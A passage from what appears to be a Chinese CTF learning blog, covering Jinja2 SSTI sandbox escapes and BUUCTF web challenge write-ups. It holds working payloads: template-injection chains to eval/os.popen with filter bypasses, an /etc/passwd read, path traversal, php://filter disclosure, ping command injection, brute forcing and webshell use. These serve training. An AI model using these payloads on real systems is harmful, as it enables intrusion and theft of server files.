%&#125;      # uld&#x3D;%c&#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125;</code></pre><p><strong>(7)+等被过滤，无法拼接字符串</strong></p><ul><li><code>~</code><br>在jinja中可以拼接字符串</li><li>格式化字符串<br>同上</li></ul><p>例一：<br>warnings.catch_warnings类</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p><p>最后获取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>例二：</p><pre class="language-python" data-language="python"><code class="language-python">class’site._Printer’类&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>获取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>例三：<br>popen</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>搭了个靶场</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先找基本类</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p><p>再获取基本类的子类</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p><p>找到重载过的<code>__init__</code>类</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p><p>查看其引用<code>__builtins__</code></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p><p>利用eval命令执行来读取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个过滤了{ { ，所以要采用{ % % }的形式</p><p>{ % % }内加控制语句</p><p>且这里展示数据要利用{ % print % }</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p><p>还有一种是利用控制语句</p><p>寻找符合条件的子类再利用WarningMessage的<code>__bulitins__</code>执行代码这个还不太懂先贴一下payload</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if  sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></pre><p>补:</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%ifsub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;</code></pre><p>要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令<br>&lt;class ‘warnings.catch_warnings’&gt;<br>一般位置为59，可以用它来调用file、os、eval、commands等</p><p>调用file</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()      #把 read() 改为 write() 就是写文件</code></pre><p>import os</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read()</code></pre><p>调用eval</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)</code></pre><p>调用system方法。（不包含system，可以绕过过滤system的情况）</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><p>利用commands进行命令执行</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125;</code></pre><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在学了在学了（</p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p><p>试着访问app。py</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p><p>这里可以看到过滤了一些内容</p><p>再查找目录内内容</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p><p>看见一个this_is_the_flag.txt</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p><p>尝试去访问,得到flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>也可以利用切片的方式</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210825113642464.png" alt="image-20210825113642464"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> ssti注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录</title>
      <link href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>记录一下自己buu的刷题进度，留下点wp方便以后看</p> <span id="more"></span><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404004946660.png" alt="image-20210404004946660"></p><p>进入后看到滑稽表情，查看源码看到有source.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404005053754.png" alt="image-20210404005053754"></p><p>看到php代码</p><p>要求传入一个字符串类型的file，且需满足class emmm中的条件</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php  highlight_file(__FILE__);  class emmm  &#123;    public static function checkFile(&amp;$page)    &#123;      $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];     判断传入的参数是否为空，且是否为string类型      if (! isset($page) || !is_string($page)) &#123;        echo &quot;you can&#39;t see it&quot;;        return false;      &#125;判断传入的参数中是否有白名单内的内容      if (in_array($page, $whitelist)) &#123;        return true;      &#125;mb_substr()函数切割参数从0到第mb_strpos()函数返回的数值      $_page &#x3D; mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)      );       判断切割后的参数是否在白名单中      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;   切割后的参数经过url解码后再进行一次过滤      $_page &#x3D; urldecode($page);      $_page &#x3D; mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)      );      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;      echo &quot;you can&#39;t see it&quot;;      return false;    &#125;  &#125;  if (! empty($_REQUEST[&#39;file&#39;])    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])  )      if内为真时进行文件包含  &#123;    include $_REQUEST[&#39;file&#39;];    exit;  &#125; else &#123;    echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;  &#125; </code></pre><p>由于hint.php中提示flag在ffffllllaaaagggg中且whitelist中仅有source.php和hint.php</p><p>所以传入</p><p>file=hint.php?ffffllllaaaagggg</p><p>无回显</p><p>后多次利用../查看上级目录</p><p>最终payload为</p><p>file=hint.php?/../../../../ffffllllaaaagggg</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404142347332.png" alt="image-20210404142347332"></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>进入后看到这个界面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152133426.png" alt="image-20210410152133426"></p><p>查看源码可以找到Archive_room.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152211470.png" alt="image-20210410152211470"></p><p>发现这个页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152300206.png" alt="image-20210410152300206"></p><p>点击按钮后页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152324518.png" alt="image-20210410152324518"></p><p>尝试抓包发现secr3t.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152351530.png" alt="image-20210410152351530"></p><p>访问得到php代码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152616564.png" alt="image-20210410152616564"></p><p>是文件包含，flag在flag.php中，过滤了../,tp,input,date.</p><p>利用php://filter绕过</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410153820003.png" alt="image-20210410153820003"></p><p>构造file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152727528.png" alt="image-20210410152727528"></p><p>base64解码后得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152820778.png" alt="image-20210410152820778"></p><h2 id="基础验证"><a href="#基础验证" class="headerlink" title="基础验证"></a>基础验证</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144522877.png" alt="image-20210404144522877"></p><p>进入后猜测用户名为admin </p><p>密码为123456进行抓包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144619135.png" alt="image-20210404144619135"></p><p>发现存在一行<strong>Authorization: Basic YWRtaW46MTIzNDU2</strong></p><p>猜测YWRtaW46MTIzNDU2为base64加密；进行解码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144840955.png" alt="image-20210404144840955"></p><p>尝试通过bp用附件中的密码进行爆破，</p><p>为密码添加前缀为admin：且要进行base64加密的规则</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144928995.png" alt="image-20210404144928995"></p><p>爆破后发现存在一个长度不同与其他包的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145023203.png" alt="image-20210404145023203"></p><p>进行发包查看其响应可发现flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145146471.png" alt="image-20210404145146471"></p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>进入后发现有四个目录，</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225319518.png" alt="image-20210405225319518"></p><p>依次寻找可找到flag.txt文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225337342.png" alt="image-20210405225337342"></p><p><code>./</code> 表示当前目录<br><code>../</code> 表示父级目录<br><code>/</code> 表示根目录</p><p><strong>目录遍历常见的是使用../来遍历目录</strong></p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>进入后为这种页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225956914.png" alt="image-20210405225956914"></p><p>仔细查找后可发现flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405230031564.png" alt="image-20210405230031564"></p><h2 id="备份文件下载-网站源码"><a href="#备份文件下载-网站源码" class="headerlink" title="备份文件下载-网站源码"></a>备份文件下载-网站源码</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405232649997.png" alt="image-20210405232649997"></p><p>1.依次试试发现存在<a href="http://www.zip,下载压缩包后发现存在三个文件/">www.zip,下载压缩包后发现存在三个文件</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233727394.png" alt="image-20210405233727394"></p><p>查看flag的文件后发现其中不存在flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233814619.png" alt="image-20210405233814619"></p><p>尝试在网页中访问得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233847576.png" alt="image-20210405233847576"></p><p>2.御剑扫描</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406114539217.png" alt="image-20210406114539217"></p><p>3.利用dirsearch工具扫描</p><p>python dirsearch.py -u <a href="http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/">http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/</a> -e*</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406122908681.png" alt="image-20210406122908681"></p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p>进入页面后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145718899.png" alt="image-20210412145718899"></p><p>于是查看/index.php.bak</p><p>得到文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145809693.png" alt="image-20210412145809693"></p><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412200444012.png" alt="image-20210412200444012"></p><p>所以查看.index.php.swp可得到文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412150945950.png" alt="image-20210412150945950"></p><p>之后在Linux系统中用命令</p><p>vim -r index.php.swp打开</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412195651269.png" alt="image-20210412195651269"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>根据题目查看后缀.DS_Store</p><p>得到一个文件</p><p>用记事本就可以查看看到</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154742543.png" alt="image-20210416154742543"></p><p>可得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154816094.png" alt="image-20210416154816094"></p><h2 id="git泄露-log"><a href="#git泄露-log" class="headerlink" title="git泄露 log"></a>git泄露 log</h2><p>题目中为git泄露可直接在后缀后加/.git</p><p>也可用dirsearch扫</p><p>用githack进行查看（百度里有几个githack没有办法用，弄了一下午）</p><p>githack要用python2 </p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233409173.png" alt="image-20210416233409173"></p><p>得到一个文件夹进入后用git bash打开</p><p>利用git log可以查看历史提交记录</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233900025.png"></p><p>看到有init ，add flag，remove flag三次提交记录</p><p>猜测flag在add flag中，用git diff命令对比与add flag的差别，可得到flag；</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233631773.png" alt="image-20210416233631773"></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>查看源码后不存在提示，尝试ping 127.0.0.1</p><p>ping通后再尝试ping 127.0.0.1|ls 看到index.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000733167.png" alt="image-20210417000733167"></p><p>多次用../查看上级目录 看见有flag文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000956928.png" alt="image-20210417000956928"></p><p>尝试查看127.0.0.1|cat ../../../flag</p><p>得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417120814848.png" alt="image-20210417120814848"></p><p>也可以用cat /flag</p><p>题目利用了命令执行</p><p>管道符</p><pre class="language-python" data-language="python"><code class="language-python">1、|（就是按位或），直接执行|后面的语句2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令5、Linux中  ; 前后都执行，无论前面真假，同&amp;，</code></pre><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目是include猜测是文件包含；</p><p>点击tips后跳转到了file=flag.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122756590.png" alt="image-20210417122756590"></p><p>用php://input时提示</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122817720.png" alt="image-20210417122817720"></p><p>然后尝试用php://filter</p><p>构造payload</p><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122714033.png" alt="image-20210417122714033"></p><p>最后用base64解码就能得到flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>文件可上传<br>知道文件上传的路径<br>上传文件可以被访问<br>上传文件可以被执行</p><p>进去看到这个界面感觉是一句话木马，然后用菜刀连接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210105533.png" alt="image-20210417210105533"></p><p>试一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210447264.png" alt="image-20210417210447264"></p><p>连接成功</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210315253.png" alt="image-20210417210315253"></p><p>然后在根目录下发现flag的文件，进入后找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210429525.png" alt="image-20210417210429525"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>进去后看到是个广告页，直接查看源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123059855.png" alt="image-20210418123059855"></p><p>发现有个Secret.php，进入之后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123139740.png" alt="image-20210418123139740"></p><p>用bp抓包然后先加个Referer: <a href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124012851.png" alt="image-20210418124012851"></p><p>看到要用Syclover 浏览器</p><p>所以把User-Agent里的内容改成User-Agent: Syclover</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124154554.png" alt="image-20210418124154554"></p><p>提示要本地访问</p><p>所以加个X-Forwarded-For:127.0.0.1（我下了个fakeip的插件）</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418125120122.png" alt="image-20210418125120122"></p><h4 id="http请求报头"><a href="#http请求报头" class="headerlink" title="http请求报头"></a><strong>http请求报头</strong></h4><p>请求报头通知服务器关于客户端求求的信息，典型的请求头有：</p><p><strong>X-Forwarded-For 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 